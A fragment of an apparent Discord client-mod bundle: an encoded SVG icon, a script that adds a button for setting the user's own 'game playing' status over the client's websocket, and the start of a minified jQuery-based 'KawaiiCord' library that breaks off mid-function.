OCIgdHJhbnNmb3JtPSJtYXRyaXgoMC42MjQxNjU5NiwwLDAsMC4yNDk1NjAwMywtODUuMTk5NTk1LC00MzIuNjc2OTcpIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzExNSkiLz48L2c+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoODM4LjgwOTA1LDg5OS45NzQ2KSIgaWQ9Imc3MDM3Ij48cGF0aCBkPSJtLTYyNS02NjkuOGMwLTAuNC0wLjItMC43LTAuNC0wLjlsLTEyLjItMTAuOGMtMC41LTAuNC0xLjEgMC4xLTEuMSAxbDAgMjEuNWMwIDAuOSAwLjYgMS40IDEuMSAxbDEyLjItMTAuOGMwLjItMC4yIDAuNC0wLjYgMC40LTF6IiBpZD0icGF0aDcwMzkiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIHNvZGlwb2RpOm5vZGV0eXBlcz0iY2NjY2NjY2MiIGNsYXNzPSJzMTkiLz48cGF0aCBzb2RpcG9kaTpub2RldHlwZXM9ImNjY2NjY2NjIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDcwNDEiIGQ9Im0tNjI1LTY3MWMwLTAuNC0wLjItMC43LTAuNC0wLjlsLTEyLjItMTAuOGMtMC41LTAuNC0xLjEgMC4xLTEuMSAxbDAgMjEuNWMwIDAuOSAwLjYgMS40IDEuMSAxbDEyLjItMTAuOGMwLjItMC4yIDAuNC0wLjYgMC40LTF6IiBzdHlsZT0iYmFzZWxpbmUtc2hpZnQ6YmFzZWxpbmU7YmxvY2stcHJvZ3Jlc3Npb246dGI7Y2xpcC1ydWxlOm5vbnplcm87Y29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzOmxpbmVhclJHQjtjb2xvci1pbnRlcnBvbGF0aW9uOnNSR0I7Y29sb3ItcmVuZGVyaW5nOmF1dG87Y29sb3I6IzAwMDAwMDtkaXJlY3Rpb246bHRyO2Rpc3BsYXk6aW5saW5lO2VuYWJsZS1iYWNrZ3JvdW5kOmFjY3VtdWxhdGU7ZmlsbC1ydWxlOm5vbnplcm87ZmlsbDp1cmwoI2xpbmVhckdyYWRpZW50NzExNyk7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6bWVkaXVtO2ltYWdlLXJlbmRlcmluZzphdXRvO2lzb2xhdGlvbjphdXRvO2xldHRlci1zcGFjaW5nOm5vcm1hbDtsaW5lLWhlaWdodDpub3JtYWw7bWl4LWJsZW5kLW1vZGU6bm9ybWFsO292ZXJmbG93OnZpc2libGU7c2hhcGUtcmVuZGVyaW5nOmF1dG87c29saWQtY29sb3I6IzAwMDAwMDtzb2xpZC1vcGFjaXR5OjE7dGV4dC1hbGlnbjpzdGFydDt0ZXh0LWFuY2hvcjpzdGFydDt0ZXh0LWRlY29yYXRpb24tY29sb3I6IzAwMDAwMDt0ZXh0LWRlY29yYXRpb24tbGluZTpub25lO3RleHQtZGVjb3JhdGlvbi1zdHlsZTpzb2xpZDt0ZXh0LWRlY29yYXRpb246bm9uZTt0ZXh0LWluZGVudDowO3RleHQtcmVuZGVyaW5nOmF1dG87dGV4dC10cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWw7d29yZC1zcGFjaW5nOm5vcm1hbDt3cml0aW5nLW1vZGU6bHItdGIiLz48L2c+PGcgaWQ9Imc3MDQzIiB0cmFuc2Zvcm09Im1hdHJpeCgwLDEsLTEsMCwtNTQwLjQ0MzA1LDkzNS4xMDM2MSkiPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0iY2NjY2NjY2MiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGlkPSJwYXRoNzA0NSIgZD0ibS02MjUtNjY5LjhjMC0wLjQtMC4yLTAuNy0wLjQtMC45bC0xMi4yLTEwLjhjLTAuNS0wLjQtMS4xIDAuMS0xLjEgMWwwIDIxLjVjMCAwLjkgMC42IDEuNCAxLjEgMWwxMi4yLTEwLjhjMC4yLTAuMiAwLjQtMC42IDAuNC0xeiIgY2xhc3M9InMxOSIvPjxwYXRoIGQ9Im0tNjI0LjQtNjY5LjZjMC0wLjQtMC4yLTAuNy0wLjQtMC45bC0xMi4yLTEwLjhjLTAuNS0wLjQtMS4xIDAuMS0xLjEgMWwwIDIxLjVjMCAwLjkgMC42IDEuNCAxLjEgMWwxMi4yLTEwLjhjMC4yLTAuMiAwLjQtMC42IDAuNC0xeiIgaWQ9InBhdGg3MDQ3IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9ImNjY2NjY2NjIiBzdHlsZT0iYmFzZWxpbmUtc2hpZnQ6YmFzZWxpbmU7YmxvY2stcHJvZ3Jlc3Npb246dGI7Y2xpcC1ydWxlOm5vbnplcm87Y29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzOmxpbmVhclJHQjtjb2xvci1pbnRlcnBvbGF0aW9uOnNSR0I7Y29sb3ItcmVuZGVyaW5nOmF1dG87Y29sb3I6IzAwMDAwMDtkaXJlY3Rpb246bHRyO2Rpc3BsYXk6aW5saW5lO2VuYWJsZS1iYWNrZ3JvdW5kOmFjY3VtdWxhdGU7ZmlsbC1ydWxlOm5vbnplcm87ZmlsbDp1cmwoI2xpbmVhckdyYWRpZW50NzExOSk7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6bWVkaXVtO2ltYWdlLXJlbmRlcmluZzphdXRvO2lzb2xhdGlvbjphdXRvO2xldHRlci1zcGFjaW5nOm5vcm1hbDtsaW5lLWhlaWdodDpub3JtYWw7bWl4LWJsZW5kLW1vZGU6bm9ybWFsO292ZXJmbG93OnZpc2libGU7c2hhcGUtcmVuZGVyaW5nOmF1dG87c29saWQtY29sb3I6IzAwMDAwMDtzb2xpZC1vcGFjaXR5OjE7dGV4dC1hbGlnbjpzdGFydDt0ZXh0LWFuY2hvcjpzdGFydDt0ZXh0LWRlY29yYXRpb24tY29sb3I6IzAwMDAwMDt0ZXh0LWRlY29yYXRpb24tbGluZTpub25lO3RleHQtZGVjb3JhdGlvbi1zdHlsZTpzb2xpZDt0ZXh0LWRlY29yYXRpb246bm9uZTt0ZXh0LWluZGVudDowO3RleHQtcmVuZGVyaW5nOmF1dG87dGV4dC10cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWw7d29yZC1zcGFjaW5nOm5vcm1hbDt3cml0aW5nLW1vZGU6bHItdGIiLz48L2c+PHBhdGggaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZD0ibTU4OC44IDE0MC44Yy00LjggMC04LjcgMy45LTguNyA4LjdsMCA1MC4zLTUwLjMgMGMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuN2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuMyAwIDAgNTAuM2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuNyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjMgNTAuMyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjdjMC00LjgtMy45LTguNy04LjctOC43bC01MC4zIDAgMC01MC4zYzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuNyAweiIgaWQ9InBhdGg3MDQ5IiBjbGFzcz0iczE3Ii8+PHBhdGggZD0ibTE4Ny45IDIxNS4xIDAgMjguMWMwIDQuMi0zLjQgNy41LTcuNSA3LjVsLTE5LjYgMGMtNC4yIDAtOC4zLTQuNS0xMS4xLTcuNS0zLjEtMy4zLTEwLTktMTAuMy0xMy4yLTAuMy01LjQgNi4yLTExIDkuOS0xNC45IDIuOS0zIDcuMy03LjUgMTEuNS03LjVsMTkuNiAwYzQuMiAwIDcuNSAzLjQgNy41IDcuNXoiIGlkPSJwYXRoNzA1MSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50NzEyMSkiLz48cGF0aCBzb2RpcG9kaTpub2RldHlwZXM9InNzc3Nzc3Nzc3MiIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIGlkPSJwYXRoNzA1MyIgZD0ibTE0My4zIDI4Ny44LTI4LjEgMGMtNC4yIDAtNy41LTMuNC03LjUtNy41bDAtMTkuNmMwLTQuMiA0LjUtOC4zIDcuNS0xMS4xIDMuMy0zLjEgOS0xMCAxMy4yLTEwLjMgNS40LTAuMyAxMSA2LjIgMTQuOSA5LjkgMyAyLjkgNy41IDcuMyA3LjUgMTEuNWwwIDE5LjZjMCA0LjItMy40IDcuNS03LjUgNy41eiIgZmlsbD0idXJsKCNsaW5lYXJHcmFkaWVudDcxMjMpIi8+PHBhdGggZD0ibTE0My4zIDE3MC40LTI4LjEgMGMtNC4yIDAtNy41IDMuNC03LjUgNy41bDAgMTkuNmMwIDQuMiA0LjUgOC4zIDcuNSAxMS4xIDMuMyAzLjEgOSAxMCAxMy4yIDEwLjMgNS40IDAuMyAxMS02LjIgMTQuOS05LjkgMy0yLjkgNy41LTcuMyA3LjUtMTEuNWwwLTE5LjZjMC00LjItMy40LTcuNS03LjUtNy41eiIgaWQ9InBhdGg3MDU1IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9InNzc3Nzc3Nzc3MiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQ3MTI1KSIvPjxnIGlkPSJnNzA1NyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoODQ1LjkxODczLDg5OS44MTU1MykiPjxyZWN0IGlkPSJyZWN0NzA1OSIgd2lkdGg9IjM4IiBoZWlnaHQ9IjIxLjIiIHg9Ii01NDIuMSIgeT0iLTYyNy4yIiBmaWxsPSIjZTdlOGU4Ii8+PHJlY3QgeT0iLTYyNy40IiB4PSItNTQyLjEiIGhlaWdodD0iMjEuMiIgd2lkdGg9IjM4IiBpZD0icmVjdDcwNjEiIGZpbGw9IiMxNjE3MTciLz48cmVjdCB5PSItNjI2LjciIHg9Ii01NDEuMyIgaGVpZ2h0PSIxOS4yIiB3aWR0aD0iMzYuMyIgaWQ9InJlY3Q3MDYzIiBmaWxsPSIjZjlmOWY5Ii8+PHJlY3QgaWQ9InJlY3Q3MDY1IiB3aWR0aD0iMzYuMyIgaGVpZ2h0PSIxOS4yIiB4PSItNTQxLjMiIHk9Ii02MjYuMSIgZmlsbD0idXJsKCNsaW5lYXJHcmFkaWVudDcxMjcpIi8+PC9nPjxwYXRoIGQ9Im0yMzAuNiAzMTMuN2MwIDAgMS4xIDUuMyAyLjggNy4zIDMuNyA0LjYgOS4yIDcuOCAxNC45IDkuNSAyMy43IDYuOSA1Ni4xIDUgODguOCA1LjYgNzMuNyAxLjQgMTAyLjQtMC40IDE0OS41LTEuNiA0LjktMC4xIDguOS00LjQgMTMuNi03LjMgNC43LTIuOSA4LjEtMTQuNCA4LjEtMTQuNGwtMC44IDBjLTEuMSAyLjYtMi41IDMuMi00LjQgMy4zLTg0LjQgMi45LTE3My4zIDYuNS0yNjMuMiAwLjctMi4xLTAuMS01LjYtMS40LTYuNC0yLjYtMC4zLTAuNC0xLjEtMS44LTEuMi0yLjN6IiBpZD0icGF0aDcwNjciIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIHNvZGlwb2RpOm5vZGV0eXBlcz0iY3Nzc3NzY2Njc3NjYyIgc3R5bGU9ImZpbGw6dXJsKCNsaW5lYXJHcmFkaWVudDcxMjkpO29wYWNpdHk6MCIvPjwvZz48L2c+PC9zdmc+';

let game_name = '';

// UI

function triggerMouseOver (element, enter) {
	// https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent
	const event = new MouseEvent('mouse' + (enter ? 'over' : 'out'), {
		view: window,
		bubbles: true,
		cancelable: true
	})

	// https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/dispatchEvent
	element.dispatchEvent(event)
}

function gameUI() {
	game_name = prompt("Game Name? (empty = remove)");
	if (game_name === null) return;
	let msg = { "op": 3, "d": { "status": window._dgs_last_status_, "since": 0, "afk": false } };
	msg.d.game = game_name.length > 0 ? { "name": game_name, "type": 0 } : null;
	window._dgs_game_entry_ = msg.d.game;
	window._ws_.send(JSON.stringify(msg));
	if (game_name.length == 0) {
		console.log("[Discord Game Status] Removed game status.");
	} else {
		console.log("[Discord Game Status] Set game name as: " + game_name);
	}
}

function setTooltipTemplate (container, template) {
	tooltip_container = container;
	tooltip_template = template;
}

function tooltipUI (ev, onoff) {
	if (tooltip_container == null) return;
	if (onoff) {
		let left = 0;
		if (ev && ev.currentTarget) {
			const rect = ev.currentTarget.getBoundingClientRect();
			left = rect.left - (game_name ? game_name.length * 1.5 : 0) - rect.width * 1.4;
		}

		tooltip_container.innerHTML = tooltip_template;
		let tooltip = tooltip_container.querySelectorAll('div[class^="tooltip-"]')[0];
		tooltip.style = "z-index: 9999; position:fixed; left:" + left + "px; bottom:51px;";
		tooltip.querySelectorAll('div[class^="tooltipContent-"]')[0].textContent = game_name && game_name.length > 0 ? 'Game Status: ' + game_name : 'Set Game Status';
	} else {
		tooltip_container.innerHTML = '';
	}
}

function tooltipUIon  (ev) { return tooltipUI (ev, true);  }
function tooltipUIoff (ev) { return tooltipUI (ev, false); }

// wait for UI
let interval_UI_id = null;
function interval_UI() {
	const nameTag = document.querySelectorAll('div[class^="nameTag-"]')[0];
	if (!nameTag) return;
	const existing_button = nameTag.parentNode.getElementsByTagName("button")[0];
	if (!existing_button) return;
	const buttons = existing_button.parentNode;

	if (buttons && buttons.childNodes.length > 0) {
		clearInterval(interval_UI_id);

		console.log("%c/!\\\\" + "%cInjected Discord Game Status!" + "%c/!\\\\", "color: #dd44dd; -webkit-text-stroke: 2px black; font-size: 30px; font-weight: bold; \
			border-style: double; border-width: 10px", "color: #dd44dd; -webkit-text-stroke: 2px black; font-size: 30px; font-weight: bold; border-style: double; \
			border-width: 10px", "color: #dd44dd; -webkit-text-stroke: 2px black; font-size: 30px; font-weight: bold; border-style: double; border-width: 10px");

		{ // steal the HTML code of a working tooltip
			triggerMouseOver (existing_button, true);
			window.tooltip = document.querySelectorAll ('div[class^="tooltip-"]')[0];
			tooltip.style = "opacity: 1; transform: none";
			let container = tooltip.parentNode.parentNode;
			let container_content = container.innerHTML;
			triggerMouseOver (existing_button, false);
			let cloned_container = container.cloneNode (true);
			container.parentNode.appendChild (cloned_container);
			setTooltipTemplate (cloned_container, container_content);
			tooltipUIoff();
		}

		// construct the actual button and style it

		const button = buttons.childNodes[1].cloneNode (true);
		buttons.appendChild (button);
		button.addEventListener ("click", gameUI, false);
		button.addEventListener ("mouseenter", tooltipUIon, false);
		button.addEventListener ("mouseleave", tooltipUIoff, false);

		let button_button = button.children[0];
		button_button.className += " btn-gamestatus";
		button_button.style = "";
		button_button.innerHTML = ""; // remove contents (svg), we're doing this via background-image like in the old Discord times!

		const style = document.createElement ("style");
		const sheet = document.head.appendChild (style).sheet;
		sheet.insertRule (".btn-gamestatus:hover { z-index: 9999; -webkit-filter: brightness(165%);}", sheet.cssRules.length);
		sheet.insertRule (".btn-gamestatus { z-index: 9999; width: 20px; height: 20px; opacity: 1; -webkit-filter: brightness(115%); background-size: 18px auto; background-repeat: no-repeat; background-position: center; background-image: url('" + button_icon + "')}", sheet.cssRules.length);
	}
}

interval_UI_id = setInterval (interval_UI, 1);

`);
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| KawaiiCord ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
!function(e){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&&define.amd)define([],e);else{var t;t="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,t.kawaiiDiscord=e()}}(function(){var e;return function e(t,n,r){function o(a,s){if(!n[a]){if(!t[a]){var u="function"==typeof require&&require;if(!s&&u)return u(a,!0);if(i)return i(a,!0);var l=new Error("Cannot find module '"+a+"'");throw l.code="MODULE_NOT_FOUND",l}var c=n[a]={exports:{}};t[a][0].call(c.exports,function(e){var n=t[a][1][e];return o(n?n:e)},c,c.exports,e,t,n,r)}return n[a].exports}for(var i="function"==typeof require&&require,a=0;a<r.length;a++)o(r[a]);return o}({1:[function(t,n,r){!function(e,t){"use strict";"object"==typeof n&&"object"==typeof n.exports?n.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(t,n){"use strict";function r(e,t){t=t||ne;var n=t.createElement("script");n.text=e,t.head.appendChild(n).parentNode.removeChild(n)}function o(e){var t=!!e&&"length"in e&&e.length,n=me.type(e);return"function"!==n&&!me.isWindow(e)&&("array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e)}function i(e,t,n){return me.isFunction(t)?me.grep(e,function(e,r){return!!t.call(e,r,e)!==n}):t.nodeType?me.grep(e,function(e){return e===t!==n}):"string"!=typeof t?me.grep(e,function(e){return se.call(t,e)>-1!==n}):Se.test(t)?me.filter(t,e,n):(t=me.filter(t,e),me.grep(e,function(e){return se.call(t,e)>-1!==n&&1===e.nodeType}))}function a(e,t){for(;(e=e[t])&&1!==e.nodeType;);return e}function s(e){var t={};return me.each(e.match(Ae)||[],function(e,n){t[n]=!0}),t}function u(e){return e}function l(e){throw e}function c(e,t,n){var r;try{e&&me.isFunction(r=e.promise)?r.call(e).done(t).fail(n):e&&me.isFunction(r=e.then)?r.call(e,t,n):t.call(void 0,e)}catch(e){n.call(void 0,e)}}function f(){ne.removeEventListener("DOMContentLoaded",f),t.removeEventListener("load",f),me.ready()}function d(){this.expando=me.expando+d.uid++}function p(e){return"true"===e||"false"!==e&&("null"===e?null:e===+e+""?+e:He.test(e)?JSON.parse(e):e)}function h(e,t,n){var r;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(Re,"-$&").toLowerCase(),n=e.getAttribute(r),"string"==typeof n){try{n=p(n)}catch(e){}Fe.set(e,t,n)}else n=void 0;return n}function m(e,t,n,r){var o,i=1,a=20,s=r?function(){return r.cur()}:function(){return me.css(e,t,"")},u=s(),l=n&&n[3]||(me.cssNumber[t]?"":"px"),c=(me.cssNumber[t]||"px"!==l&&+u)&&We.exec(me.css(e,t));if(c&&c[3]!==l){l=l||c[3],n=n||[],c=+u||1;do i=i||".5",c/=i,me.style(e,t,c+l);while(i!==(i=s()/u)&&1!==i&&--a)}return n&&(c=+c||+u||0,o=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=o)),o}function v(e){var t,n=e.ownerDocument,r=e.nodeName,o=Ge[r];return o?o:(t=n.body.appendChild(n.createElement(r)),o=me.css(t,"display"),t.parentNode.removeChild(t),"none"===o&&(o="block"),Ge[r]=o,o)}function g(e,t){for(var n,r,o=[],i=0,a=e.length;i<a;i++)r=e[i],r.style&&(n=r.style.display,t?("none"===n&&(o[i]=Pe.get(r,"display")||null,o[i]||(r.style.display="")),""===r.style.display&&ze(r)&&(o[i]=v(r))):"none"!==n&&(o[i]="none",Pe.set(r,"display",n)));for(i=0;i<a;i++)null!=o[i]&&(e[i].style.display=o[i]);return e}function y(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&me.nodeName(e,t)?me.merge([e],n):n}function x(e,t){for(var n=0,r=e.length;n<r;n++)Pe.set(e[n],"globalEval",!t||Pe.get(t[n],"globalEval"))}function b(e,t,n,r,o){for(var i,a,s,u,l,c,f=t.createDocumentFragment(),d=[],p=0,h=e.length;p<h;p++)if(i=e[p],i||0===i)if("object"===me.type(i))me.merge(d,i.nodeType?[i]:i);else if(Ke.test(i)){for(a=a||f.appendChild(t.createElement("div")),s=(Ve.exec(i)||["",""])[1].toLowerCase(),u=Ye[s]||Ye._default,a.innerHTML=u[1]+me.htmlPrefilter(i)+u[2],c=u[0];c--;)a=a.lastChild;me.merge(d,a.childNodes),a=f.firstChild,a.textContent=""}else d.push(t.createTextNode(i));for(f.textContent="",p=0;i=d[p++];)if(r&&me.inArray(i,r)>-1)o&&o.push(i);else if(l=me.contains(i.ownerDocument,i),a=y(f.appendChild(i),"script"),l&&x(a),n)for(c=0;i=a[c++];)Xe.test(i.type||"")&&n.push(i);return f}function w(){return!0}function T(){return!1}function _(){try{return ne.activeElement}catch(e){}}function C(e,t,n,r,o,i){var a,s;if("object"==typeof t){"string"!=typeof n&&(r=r||n,n=void 0);for(s in t)C(e,s,n,r,t[s],i);return e}if(null==r&&null==o?(o=n,r=n=void 0):null==o&&("string"==typeof n?(o=r,r=void 0):(o=r,r=n,n=void 0)),o===!1)o=T;else if(!o)return e;return 1===i&&(a=o,o=function(e){return me().off(e),a.apply(this,arguments)},o.guid=a.guid||(a.guid=me.guid++)),e.each(function(){me.event.add(this,t,o,r,n)})}function S(e,t){return me.nodeName(e,"table")&&me.nodeName(11!==t.nodeType?t:t.firstChild,"tr")?e.getElementsByTagName("tbody")[0]||e:e}function j(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function E(e){var t=ot.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function k(e,t){var n,r,o,i,a,s,u,l;if(1===t.nodeType){if(Pe.hasData(e)&&(i=Pe.access(e),a=Pe.set(t,i),l=i.events)){delete a.handle,a.events={};for(o in l)for(n=0,r=l[o].length;n<r;n++)me.event.add(t,o,l[o][n])}Fe.hasData(e)&&(s=Fe.access(e),u=me.extend({},s),Fe.set(t,u))}}function N(e,t){var n=t.nodeName.toLowerCase();"input"===n&&Ue.test(e.type)?t.checked=e.checked:"input"!==n&&"textarea"!==n||(t.defaultValue=e.defaultValue)}function D(e,t,n,o){t=ie.apply([],t);var i,a,s,u,l,c,f=0,d=e.length,p=d-1,h=t[0],m=me.isFunction(h);if(m||d>1&&"string"==typeof h&&!pe.checkClone&&rt.test(h))return e.each(function(r){var i=e.eq(r);m&&(t[0]=h.call(this,r,i.html())),D(i,t,n,o)});if(d&&(i=b(t,e[0].ownerDocument,!1,e,o),a=i.firstChild,1===i.childNodes.length&&(i=a),a||o)){for(s=me.map(y(i,"script"),j),u=s.length;f<d;f++)l=i,f!==p&&(l=me.clone(l,!0,!0),u&&me.merge(s,y(l,"script"))),n.call(e[f],l,f);if(u)for(c=s[s.length-1].ownerDocument,me.map(s,E),f=0;f<u;f++)l=s[f],Xe.test(l.type||"")&&!Pe.access(l,"globalEval")&&me.contains(c,l)&&(l.src?me._evalUrl&&me._evalUrl(l.src):r(l.textContent.replace(it,""),c))}return e}function A(e,t,n){for(var r,o=t?me.filter(t,e):e,i=0;null!=(r=o[i]);i++)n||1!==r.nodeType||me.cleanData(y(r)),r.parentNode&&(n&&me.contains(r.ownerDocument,r)&&x(y(r,"script")),r.parentNode.removeChild(r));return e}function O(e,t,n){var r,o,i,a,s=e.style;return n=n||ut(e),n&&(a=n.getPropertyValue(t)||n[t],""!==a||me.contains(e.ownerDocument,e)||(a=me.style(e,t)),!pe.pixelMarginRight()&&st.test(a)&&at.test(t)&&(r=s.width,o=s.minWidth,i=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=r,s.minWidth=o,s.maxWidth=i)),void 0!==a?a+"":a}function q(e,t){return{get:function(){return e()?void delete this.get:(this.get=t).apply(this,arguments)}}}function M(e){if(e in pt)return e;for(var t=e[0].toUpperCase()+e.slice(1),n=dt.length;n--;)if(e=dt[n]+t,e in pt)return e}function L(e,t,n){var r=We.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function P(e,t,n,r,o){var i,a=0;for(i=n===(r?"border":"content")?4:"width"===t?1:0;i<4;i+=2)"margin"===n&&(a+=me.css(e,n+$e[i],!0,o)),r?("content"===n&&(a-=me.css(e,"padding"+$e[i],!0,o)),"margin"!==n&&(a-=me.css(e,"border"+$e[i]+"Width",!0,o))):(a+=me.css(e,"padding"+$e[i],!0,o),"padding"!==n&&(a+=me.css(e,"border"+$e[i]+"Width",!0,o)));return a}function F(e,t,n){var r,o=!0,i=ut(e),a="border-box"===me.css(e,"boxSizing",!1,i);if(e.getClientRects().length&&(r=e.getBoundingClientRect()[t]),r<=0||null==r){if(r=O(e,t,i),(r<0||null==r)&&(r=e.style[t]),st.test(r))return r;o=a&&(pe.boxSizingReliable()||r===e.style[t]),r=parseFloat(r)||0}return r+P(e,t,n||(a?"border":"content"),o,i)+"px"}function H(e,t,n,r,o){return new H.prototype.init(e,t,n,r,o)}function R(){mt&&(t.requestAnimationFrame(R),me.fx.tick())}function I(){return t.setTimeout(function(){ht=void 0}),ht=me.now()}function W(e,t){var n,r=0,o={height:e};for(t=t?1:0;r<4;r+=2-t)n=$e[r],o["margin"+n]=o["padding"+n]=e;return t&&(o.opacity=o.width=e),o}function $(e,t,n){for(var r,o=(G.tweeners[t]||[]).concat(G.tweeners["*"]),i=0,a=o.length;i<a;i++)if(r=o[i].call(n,t,e))return r}function z(e,t,n){var r,o,i,a,s,u,l,c,f="width"in t||"height"in t,d=this,p={},h=e.style,m=e.nodeType&&ze(e),v=Pe.get(e,"fxshow");n.queue||(a=me._queueHooks(e,"fx"),null==a.unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,d.always(function(){d.always(function(){a.unqueued--,me.queue(e,"fx").length||a.empty.fire()})}));for(r in t)if(o=t[r],vt.test(o)){if(delete t[r],i=i||"toggle"===o,o===(m?"hide":"show")){if("show"!==o||!v||void 0===v[r])continue;m=!0}p[r]=v&&v[r]||me.style(e,r)}if(u=!me.isEmptyObject(t),u||!me.isEmptyObject(p)){f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],l=v&&v.display,null==l&&(l=Pe.get(e,"display")),c=me.css(e,"display"),"none"===c&&(l?c=l:(g([e],!0),l=e.style.display||l,c=me.css(e,"display"),g([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===me.css(e,"float")&&(u||(d.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",d.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1;for(r in p)u||(v?"hidden"in v&&(m=v.hidden):v=Pe.access(e,"fxshow",{display:l}),i&&(v.hidden=!m),m&&g([e],!0),d.done(function(){m||g([e]),Pe.remove(e,"fxshow");for(r in p)me.style(e,r,p[r])})),u=$(m?v[r]:0,r,d),r in v||(v[r]=u.start,m&&(u.end=u.start,u.start=0))}}function B(e,t){var n,r,o,i,a;for(n in e)if(r=me.camelCase(n),o=t[r],i=e[n],me.isArray(i)&&(o=i[1],i=e[n]=i[0]),n!==r&&(e[r]=i,delete e[n]),a=me.cssHooks[r],a&&"expand"in a){i=a.expand(i),delete e[r];for(n in i)n in e||(e[n]=i[n],t[n]=o)}else t[r]=o}function G(e,t,n){var r,o,i=0,a=G.prefilters.length,s=me.Deferred().always(function(){delete u.elem}),u=function(){if(o)return!1;for(var t=ht||I(),n=Math.max(0,l.startTime+l.duration-t),r=n/l.duration||0,i=1-r,a=0,u=l.tweens.length;a<u;a++)l.tweens[a].run(i);return s.notifyWith(e,[l,i,n]),i<1&&u?n:(s.resolveWith(e,[l]),!1)},l=s.promise({elem:e,props:me.extend({},t),opts:me.extend(!0,{specialEasing:{},easing:me.easing._default},n),originalProperties:t,originalOptions:n,startTime:ht||I(),duration:n.duration,tweens:[],createTween:function(t,n){var r=me.Tween(e,l.opts,t,n,l.opts.specialEasing[t]||l.opts.easing);return l.tweens.push(r),r},stop:function(t){var n=0,r=t?l.tweens.length:0;if(o)return this;for(o=!0;n<r;n++)l.tweens[n].run(1);return t?(s.notifyWith(e,[l,1,0]),s.resolveWith(e,[l,t])):s.rejectWith(e,[l,t]),this}}),c=l.props;for(B(c,l.opts.specialEasing);i<a;i++)if(r=G.prefilters[i].call(l,e,c,l.opts))return me.isFunction(r.stop)&&(me._queueHooks(l.elem,l.opts.queue).stop=me.proxy(r.stop,r)),r;return me.map(c,$,l),me.isFunction(l.opts.start)&&l.opts.start.call(e,l),me.fx.timer(me.extend(u,{elem:e,anim:l,queue:l.opts.queue})),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always)}function U(e){var t=e.match(Ae)||[];return t.join(" ")}function V(e){return e.getAttribute&&e.getAttribute("class")||""}function X(e,t,n,r){var o;if(me.isArray(t))me.each(t,function(t,o){n||Et.test(e)?r(e,o):X(e+"["+("object"==typeof o&&null!=o?t:"")+"]",o,n,r)});else if(n||"object"!==me.type(t))r(e,t);else for(o in t)X(e+"["+o+"]",t[o],n,r)}function Y(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,o=0,i=t.toLowerCase().match(Ae)||[];if(me.isFunction(n))for(;r=i[o++];)"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function K(e,t,n,r){function o(s){var u;return i[s]=!0,me.each(e[s]||[],function(e,s){var 